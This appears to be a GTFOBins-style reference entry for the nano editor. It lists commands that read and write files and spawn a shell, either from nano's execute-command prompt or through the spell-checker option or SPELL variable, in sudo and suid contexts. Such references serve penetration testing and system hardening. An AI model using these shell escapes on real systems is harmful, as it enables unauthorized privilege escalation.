---
type: gtfobin
name: nano
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# nano

## file-read

```bash
nano /path/to/input-file
```
_The file content is displayed in the terminal interface._
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
nano /path/to/output-file
DATA
^O
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
nano
^R^X
reset; sh 1>&0 2>&0
```
**Contexts:** sudo, suid, unprivileged

```bash
nano -s /bin/sh
/bin/sh
^T^T
```
_The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed._
**Contexts:** sudo, suid, unprivileged
